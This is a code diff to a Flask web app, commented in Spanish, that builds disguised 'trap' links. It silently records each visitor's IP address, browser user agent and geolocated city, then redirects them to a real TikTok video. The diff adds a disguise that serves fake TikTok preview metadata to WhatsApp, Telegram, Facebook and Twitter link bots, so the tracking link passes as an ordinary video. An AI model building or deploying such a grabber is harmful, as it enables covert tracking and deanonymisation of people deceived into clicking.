@@ -70,43 +70,53 @@ def home():
     # Esto busca el archivo index.html en la carpeta templates
     return render_template('index.html')
 
+# --- RUTA MODIFICADA: AHORA RECIBE EL LINK REAL ---
 @app.route('/api/crear_trampa', methods=['POST'])
 def crear_trampa():
     data = request.json
-    nombre = data.get('nombre', 'Trampa Sin Nombre')
+    nombre = data.get('nombre', 'Trampa TikTok')
+    # Aquí recibimos el link real del video
+    url_destino = data.get('url_destino', 'https://www.google.com') 
+    
     token = generar_token()
     
     conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("INSERT INTO trampas (token, nombre) VALUES (%s, %s)", (token, nombre))
+    # Guardamos el link real en la base de datos
+    cur.execute(
+        "INSERT INTO trampas (token, nombre, url_destino) VALUES (%s, %s, %s)", 
+        (token, nombre, url_destino)
+    )
     conn.commit()
     cur.close()
     conn.close()
     
     return jsonify({"status": "ok", "link": f"{request.host_url}s/{token}"})
 
+# --- RUTA MODIFICADA: REDIRECCIÓN INTELIGENTE ---
 @app.route('/s/<token>')
 def trampa_activada(token):
-    # 1. Obtener IP Real
+    # 1. CAPTURA FORENSE (Igual que antes)
     ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
-    # Si hay varias IPs, tomamos la primera (la real)
-    if ip_victima and ',' in ip_victima:
-        ip_victima = ip_victima.split(',')[0].strip()
-        
+    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
     user_agent = request.headers.get('User-Agent')
-    
-    # 2. RASTREO SATELITAL (GEO)
     ubicacion = obtener_ubicacion(ip_victima)
-    print(f"⚠️ INTRUSO: {ip_victima} desde {ubicacion}")
     
     conn = get_db_connection()
     cur = conn.cursor()
-    cur.execute("SELECT id FROM trampas WHERE token = %s", (token,))
+    
+    # Buscamos la trampa Y el link de destino
+    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (token,))
     trampa = cur.fetchone()
+    
+    url_final = "https://www.tiktok.com" # Destino por defecto si algo falla
     
     if trampa:
         trampa_id = trampa[0]
-        # Guardamos también la CIUDAD en la base de datos
+        url_final = trampa[1] # Recuperamos el link original que guardaste
+        
+        # Guardamos al intruso
+        print(f"⚠️ INTRUSO: {ip_victima} -> Redirigiendo a {url_final}")
         cur.execute(
             "INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)",
             (trampa_id, ip_victima, user_agent, ubicacion)
@@ -116,7 +126,25 @@ def trampa_activada(token):
     cur.close()
     conn.close()
 
-    return redirect("https://www.google.com/error?code=404")
+    # 2. EL DISFRAZ DE TIKTOK (Para WhatsApp/Telegram)
+    # Si es un bot de previsualización, le mostramos metadatos de TikTok
+    user_agent_str = str(user_agent).lower()
+    if "facebook" in user_agent_str or "whatsapp" in user_agent_str or "telegram" in user_agent_str or "twitter" in user_agent_str:
+        return f"""
+        <html>
+        <head>
+            <meta property="og:site_name" content="TikTok">
+            <meta property="og:title" content="TikTok - Video Viral">
+            <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png">
+            <meta property="og:description" content="Mira este video.">
+            <meta property="og:type" content="video.other">
+        </head>
+        <body></body>
+        </html>
+        """
+
+    # 3. LA REDIRECCIÓN FINAL (La víctima va al video real)
+    return redirect(url_final)
 
 @app.route('/api/ver_ataques', methods=['GET'])
 def ver_ataques():
@@ -151,6 +179,21 @@ def ver_ataques():
     return jsonify(resultado)
 
 inicializar_db()
+
+# --- HERRAMIENTA DE ACTUALIZACIÓN DE DB ---
+@app.route('/update_db_schema')
+def update_db_schema():
+    try:
+        conn = get_db_connection()
+        cur = conn.cursor()
+        # Comando SQL para agregar la columna si no existe
+        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS url_destino TEXT;")
+        conn.commit()
+        cur.close()
+        conn.close()
+        return "✅ Base de datos actualizada: Columna 'url_destino' agregada."
+    except Exception as e:
+        return f"❌ Error: {e}"
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
